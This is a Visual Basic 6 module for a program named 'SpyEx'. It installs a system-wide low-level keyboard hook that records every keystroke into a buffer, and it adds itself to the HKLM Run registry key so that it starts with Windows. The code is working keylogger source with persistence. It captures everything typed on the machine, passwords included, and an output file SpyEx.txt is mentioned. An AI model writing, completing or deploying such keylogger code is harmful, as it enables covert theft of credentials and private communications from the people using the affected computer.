Attribute VB_Name = "Module1"
Private Type KBDLLHOOKSTRUCT
 code As Long
End Type

Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Private Const WH_KEYBOARD_LL = 13&
Private Const WM_KEYDOWN = &H100

'Registry Constants
Private Const READ_CONTROL As Long = &H20000
Private Const STANDARD_RIGHTS_WRITE As Long = (READ_CONTROL)
Private Const KEY_SET_VALUE As Long = &H2
Private Const KEY_CREATE_SUB_KEY As Long = &H4
Private Const SYNCHRONIZE As Long = &H100000
Private Const KEY_WRITE As Long = _
((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
Private Const HKEY_LOCAL_MACHINE As Long = &H80000002
Private Const REG_SZ As Long = 1

Private hook As Long
Dim hookKey As KBDLLHOOKSTRUCT
Public intercept As Boolean
Public keyCode As Long, keys As String, keyList, keyChar
'Registry Variables to start program with windows
Dim subKey As String, key As Long, str As String, size As Long

Public Function startup()
  subKey = "software\microsoft\windows\currentversion\run"
  str = App.Path & "\" & App.EXEName & ".exe"
  size = Len(str)
  
  'Open key
  RegOpenKeyEx HKEY_LOCAL_MACHINE, subKey, 0, KEY_WRITE, key
  
  'Set Value of key
  RegSetValueEx key, "SpyEx", 0, REG_SZ, ByVal str, size
  
  'Close key
  RegCloseKey key
End Function

Public Function KeyboardProc(ByVal ncode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

 'Check if key is pressed down
 If wParam = WM_KEYDOWN Then
   'Copy Memory of key to variable hookKey
   Call CopyMemory(hookKey, ByVal lParam, Len(hookKey))
   keyCode = hookKey.code
   
   'Check array for key
   For i = 0 To 21
     If keyCode = keyChar(i) Then keys = keys & "[" & keyList(i) & "]"
   Next
   For i = 22 To 47
     If keyCode = keyChar(i) Then keys = keys & keyList(i)
   Next
   
   'Letters and numbers
   If (keyCode >= 48 And keyCode <= 57) Or (keyCode >= 65 And keyCode <= 90) Then
     keys = keys & Chr(keyCode)
   ElseIf keyCode = 13 Then
     keys = keys & vbNewLine & vbTab
   ElseIf keyCode = 123 Then
     MsgBox "SpyEx is closing... The output file is located in " & App.Path & "\SpyEx.txt", vbCritical, "SpyEx"
     Unload Form1
   End If
 End If
 
 'If the message is not one we want to trap, pass it along
 KeyboardProc = CallNextHookEx(hook, ncode, wParam, lParam)
End Function

Public Function KeyboardHook()
 hook = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf KeyboardProc, App.hInstance, 0&)
End Function

Public Function Unhook()
  Call UnhookWindowsHookEx(hook)
  hook = 0
  Unhook = 1
End Function
